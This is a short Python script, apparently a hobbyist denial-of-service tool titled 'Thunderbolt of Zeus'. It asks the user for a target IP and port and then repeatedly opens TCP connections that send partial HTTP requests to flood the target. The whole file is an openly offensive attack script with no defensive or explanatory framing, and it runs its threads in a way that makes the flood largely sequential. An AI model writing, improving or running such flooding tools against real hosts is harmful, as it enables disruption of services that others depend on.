import socket
import threading

connect = True

def attack(target_ip, target_port):
    global connect

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))

    except:
        connect = False
        print("Attack finish.")
        exit()

    finally:
        s.close()

def start_attack():
    target_ip = input("Enter the target IP: ")
    target_port = int(input(f"Enter the target port of {target_ip}: "))
    validation = input("☢️⚠️Are you sure than you want to lunch the attack [Y/n]⚠️☢️: ")

    if validation.lower() == "" or validation.lower() == "y":
        threads = []

        while connect == True:
            my_thread = threading.Thread(target=attack, args=(target_ip, target_port))
            my_thread.start()
            threads.append(my_thread)

            for thread in threads:
                thread.join()

    else:
        print("Attack not lunch.")

def main():
    print(r"""___________.__                        .___             ___.            .__    __   
\__    ___/|  |__   __ __   ____    __| _/ ____ _______\_ |__    ____  |  | _/  |_ 
  |    |   |  |  \ |  |  \ /    \  / __ |_/ __ \\_  __ \| __ \  /  _ \ |  | \   __\
  |    |   |   Y  \|  |  /|   |  \/ /_/ |\  ___/ |  | \/| \_\ \(  <_> )|  |__|  |  
  |____|   |___|  /|____/ |___|  /\____ | \___  >|__|   |___  / \____/ |____/|__|  
                \/             \/      \/     \/            \/                     
                                                                                   
         _____    __________                                                       
  ____ _/ ____\   \____    / ____   __ __  ______                                  
 /  _ \\   __\      /     /_/ __ \ |  |  \/  ___/                                  
(  <_> )|  |       /     /_\  ___/ |  |  /\___ \                                   
 \____/ |__|      /_______ \\___  >|____//____  >                                  
                          \/    \/            \/                                   """)

    start_attack()

if __name__ == "__main__":
    main()
